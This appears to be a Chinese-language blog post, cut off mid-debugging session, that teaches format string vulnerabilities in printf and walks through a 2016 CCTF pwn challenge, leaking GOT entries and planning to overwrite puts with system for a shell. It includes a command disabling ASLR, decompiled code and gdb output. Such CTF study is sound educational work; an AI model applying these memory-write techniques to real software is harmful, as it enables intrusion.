@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PWN," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 基础知识触发格式化字符串漏洞的函数有限，主要就是printf,sprintf.fprintf等print家族函数，就用printf为例来记录一些相关的基础知识。">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串">
+<meta property="og:url" content="http://yoursite.com/2018/03/17/格式化字符串/index.html">
+<meta property="og:site_name" content="Mask&#39;s Blog">
+<meta property="og:description" content="0x00 基础知识触发格式化字符串漏洞的函数有限，主要就是printf,sprintf.fprintf等print家族函数，就用printf为例来记录一些相关的基础知识。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-17T13:22:27.527Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串">
+<meta name="twitter:description" content="0x00 基础知识触发格式化字符串漏洞的函数有限，主要就是printf,sprintf.fprintf等print家族函数，就用printf为例来记录一些相关的基础知识。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/17/格式化字符串/"/>
+
+
+
+
+
+  <title>格式化字符串 | Mask's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mask's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/17/格式化字符串/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mask">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mask's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">格式化字符串</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-17T19:06:09+08:00">
+                2018-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h2><p>触发格式化字符串漏洞的函数有限，主要就是printf,sprintf.fprintf等print家族函数，就用printf为例来记录一些相关的基础知识。</p>
+<a id="more"></a>
+<p>printf()函数的一般形式是<code>printf(&quot;format&quot;,输出项)</code>,其中format是格式化参数，看一下它的结构吧：<code>%[标志][输出最小宽度][.精度][长度]类型</code>,其中跟格式化字符串漏洞有关系的主要有以下几点：</p>
+<p>1、输出最小宽度：用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。</p>
+<p>2、类型：</p>
+<ul>
+<li>%c：输出字符，配上%n可用于向指定地址写数据。</li>
+<li>%d：输出十进制整数，配上%n可用于向指定地址写数据。</li>
+<li>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</li>
+<li>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</li>
+<li>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</li>
+<li>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</li>
+<li>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据</li>
+</ul>
+<p>以上是需要关注的重点</p>
+<h2 id="0x01-漏洞的触发"><a href="#0x01-漏洞的触发" class="headerlink" title="0x01 漏洞的触发"></a>0x01 漏洞的触发</h2><p>printf()函数正常情况下的使用应该类似像这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(&quot;%s&quot;,str);</span><br></pre></td></tr></table></figure>
+<p>但是要是一不小心，可能会变成这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(str);</span><br></pre></td></tr></table></figure>
+<p>那么，因为我们输入的参数是可控的，如果我们输入的参数中结合format，那么我们就能进行相应的内存读取和写入</p>
+<p>先把ASLR关了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@mask-virtual-machine:/home/mask/format_pwn# echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p><strong>第一个程序format.c</strong></p>
+<p>程序源码：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	int a=1,b=2,c=3;</span><br><span class="line">	char buf[]=&quot;test&quot;;</span><br><span class="line">	printf(&quot;%s %d %d %d\n&quot;,buf,a,b,c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后编译（关闭了栈保护）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o format format.c</span><br></pre></td></tr></table></figure>
+<p>运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn$ ./format</span><br><span class="line">test 1 2 3</span><br></pre></td></tr></table></figure>
+<p>运行正常，现在修改一下format参数，多加一个%x：</p>
+<p>printf(“%s %d %d %d %x\n”,buf,a,b,c);</p>
+<p>再编译运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn$ gcc -fno-stack-protector -o format format.c</span><br><span class="line">format.c: In function ‘main’:</span><br><span class="line">format.c:6:8: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line"> printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b,c);</span><br><span class="line">^</span><br><span class="line">mask@mask-virtual-machine:~/format_pwn$</span><br></pre></td></tr></table></figure>
+<p>编译有警告，但是依然通过了，输出结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn$ ./format</span><br><span class="line">test 1 2 3 b7fbb000</span><br></pre></td></tr></table></figure>
+<p>我们知道，这个%x的格式化参数后面并没有与之对应的输出项，但是依然可以输出数据，那么这个输出的数据在哪？它是什么？我们现在开始对这个程序进行调试分析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x80484f0 (&quot;%s %d %d %d %x\n&quot;)</span><br><span class="line">arg[1]: 0xbffff03f (&quot;test&quot;)</span><br><span class="line">arg[2]: 0x1 </span><br><span class="line">arg[3]: 0x2 </span><br><span class="line">arg[4]: 0x3 </span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff010 --&gt; 0x80484f0 (&quot;%s %d %d %d %x\n&quot;)</span><br><span class="line">0004| 0xbffff014 --&gt; 0xbffff03f (&quot;test&quot;)</span><br><span class="line">0008| 0xbffff018 --&gt; 0x1 </span><br><span class="line">0012| 0xbffff01c --&gt; 0x2 </span><br><span class="line">0016| 0xbffff020 --&gt; 0x3 </span><br><span class="line">0020| 0xbffff024 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0024| 0xbffff028 --&gt; 0xb7fb9244 --&gt; 0xb7e21020 (&lt;_IO_check_libio&gt;:	)</span><br><span class="line">0028| 0xbffff02c --&gt; 0xb7e210ec (&lt;init_cacheinfo+92&gt;:	test   eax,eax)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048451 in main ()</span><br><span class="line">gdb-peda$ n</span><br><span class="line">test 1 2 3 b7fbb000</span><br></pre></td></tr></table></figure>
+<p>这是运行printf时的堆栈布局，可以看到<code>b7fbb000</code>即为四个输出项的后一个栈中的数据，那么我们再加一个%x，是不是就能输出再下一个<code>0xb7fb9244</code>为了验证我们的想法对不对，再次修改程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s %d %d %d %x %x \n&quot;,buf,a,b,c);</span><br></pre></td></tr></table></figure>
+<p>然后编译运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn$ gcc -fno-stack-protector -o format format.c</span><br><span class="line">format.c: In function ‘main’:</span><br><span class="line">format.c:6:8: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line"> printf(&quot;%s %d %d %d %x %x\n&quot;,buf,a,b,c);</span><br><span class="line">^</span><br><span class="line">format.c:6:8: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line">mask@mask-virtual-machine:~/format_pwn$ ./format</span><br><span class="line">test 1 2 3 b7fbb000 b7fb9244</span><br></pre></td></tr></table></figure>
+<p>那么只要我们能够控制输入的format参数，那么我们就能一直读取内存数据</p>
+<p>读完了，我们来看看怎样通过%n写数据</p>
+<p><strong>第二个程序format2.c</strong></p>
+<p>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int num=66666666;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Before: num = %d\n&quot;, num);</span><br><span class="line">  printf(&quot;%d%n\n&quot;, num, &amp;num);</span><br><span class="line">  printf(&quot;After: num = %d\n&quot;, num);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn$ ./format2</span><br><span class="line">Before: num = 66666666</span><br><span class="line">66666666</span><br><span class="line">After: num = 8</span><br></pre></td></tr></table></figure>
+<p>这样就实现了改写数据</p>
+<h2 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h2><p>例子是2016CCTF的pwn3，正好利用了格式化字符串漏洞写数据</p>
+<p>先分析源码：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed int v3; // eax@2</span><br><span class="line">  int v4; // [sp+14h] [bp-2Ch]@1</span><br><span class="line">  signed int v5; // [sp+3Ch] [bp-4h]@2</span><br><span class="line"></span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  ask_username((char *)&amp;v4);</span><br><span class="line">  ask_password((char *)&amp;v4);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  print_prompt();</span><br><span class="line">  v3 = get_command();</span><br><span class="line">  v5 = v3;</span><br><span class="line">  if ( v3 != 2 )</span><br><span class="line">break;</span><br><span class="line">  put_file();</span><br><span class="line">&#125;</span><br><span class="line">if ( v3 == 3 )</span><br><span class="line">&#123;</span><br><span class="line">  show_dir();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  if ( v3 != 1 )</span><br><span class="line">exit(1);</span><br><span class="line">  get_file();</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现有三个主要的功能函数，<code>put_file</code>,<code>show_dir</code>,<code>get_file</code></p>
+<p>然后还有登录函数<code>ask_username</code>和<code>ask_password</code><br>跟进查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">char *__cdecl ask_username(char *dest)</span><br><span class="line">&#123;</span><br><span class="line">  char src[40]; // [sp+14h] [bp-34h]@1</span><br><span class="line">  int i; // [sp+3Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  puts(&quot;Connected to ftp.hacker.server&quot;);</span><br><span class="line">  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);</span><br><span class="line">  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%40s&quot;, src);</span><br><span class="line">  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )</span><br><span class="line">++src[i];</span><br><span class="line">  return strcpy(dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把你输入的用户名字符串中的每个字符的ascii码+1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl ask_password(char *s1)</span><br><span class="line">&#123;</span><br><span class="line">  if ( strcmp(s1, &quot;sysbdmin&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">puts(&quot;who you are?&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;welcome!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>等于”sysbadmin”就输出“welcome”并返回继续，不然就终止程序，那么用户名是“<code>sysbdmin</code>”字符串中每个字母的ascii码减1，即<code>rxraclhm</code>；</p>
+<p>然后运行一下程序：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn/CCTF$ ./pwn3 </span><br><span class="line">Connected to ftp.hacker.server</span><br><span class="line">220 Serv-U FTP Server v6.4 for WinSock ready...</span><br><span class="line">Name (ftp.hacker.server:Rainism):rxraclhm</span><br><span class="line">welcome!</span><br><span class="line">ftp&gt;put</span><br><span class="line">please enter the name of the file you want to upload:format</span><br><span class="line">then, enter the content:hello,world</span><br><span class="line">ftp&gt;dir</span><br><span class="line">format</span><br><span class="line">ftp&gt;get</span><br><span class="line">enter the file name you want to get:format</span><br><span class="line">hello,worldftp&gt;</span><br></pre></td></tr></table></figure>
+<p>用ida分别查看那三个功能函数的伪代码，可以发现，get_file函数中存在格式化字符串漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int get_file()</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [sp+1Ch] [bp-FCh]@5</span><br><span class="line">  char s1; // [sp+E4h] [bp-34h]@1</span><br><span class="line">  char *i; // [sp+10Ch] [bp-Ch]@3</span><br><span class="line"></span><br><span class="line">  printf(&quot;enter the file name you want to get:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);</span><br><span class="line">  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )</span><br><span class="line">puts(&quot;too young, too simple&quot;);</span><br><span class="line">  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )</span><br><span class="line">  &#123;</span><br><span class="line">if ( !strcmp(i, &amp;s1) )</span><br><span class="line">&#123;</span><br><span class="line">  strcpy(&amp;dest, i + 40);</span><br><span class="line">  return printf(&amp;dest);</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return printf(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么我们就可以利用这个漏洞以“<code>/bin/sh</code>”为参数调用system，也就实现了getshell</p>
+<p>思路是：</p>
+<ul>
+<li>先读取<code>puts@got</code>的内容，得到puts的地址，之后通过lib中偏移量固定的方式算出system的地址</li>
+<li>将system地址写到puts@got里</li>
+<li>让程序去执行puts(‘/bin/sh’), 这时实际是执行system(‘/bin/sh’)</li>
+</ul>
+<p>下面就开始调试分析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn/CCTF$ gdb ./pwn3 </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./pwn3...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY: disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX: ENABLED</span><br><span class="line">PIE   : disabled</span><br><span class="line">RELRO : Partial</span><br></pre></td></tr></table></figure>
+<p>开了NX</p>
+<p>第一步，我们需要找到<code>system</code>的函数地址，这里我们需要通过格式化漏洞泄露出libc的地址然后去查询对应的版本</p>
+<p>首先通过IDA可以知道printf的地址：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:08048895 lea eax, [ebp+dest]</span><br><span class="line">.text:0804889B ; 18:   return printf(&amp;dest);</span><br><span class="line">.text:0804889B mov [esp], eax  ; format</span><br><span class="line">.text:0804889E call_printf</span><br><span class="line">.text:080488A3 leave</span><br><span class="line">.text:080488A4 retn</span><br><span class="line">.text:080488A4 get_fileendp</span><br></pre></td></tr></table></figure>
+<p>那么我们下断点 ：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x0804889E</span><br><span class="line">Breakpoint 1 at 0x804889e</span><br></pre></td></tr></table></figure>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xbfffef0c --&gt; 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x71 (&apos;q&apos;)</span><br><span class="line">EDX: 0x804b410 --&gt; 0x20 (&apos; &apos;)</span><br><span class="line">ESI: 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0xbffff008 --&gt; 0xbffff058 --&gt; 0x0 </span><br><span class="line">ESP: 0xbfffeef0 --&gt; 0xbfffef0c --&gt; 0x0 </span><br><span class="line">EIP: 0x804889e (&lt;get_file+168&gt;:	call   0x80484c0 &lt;printf@plt&gt;)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048893 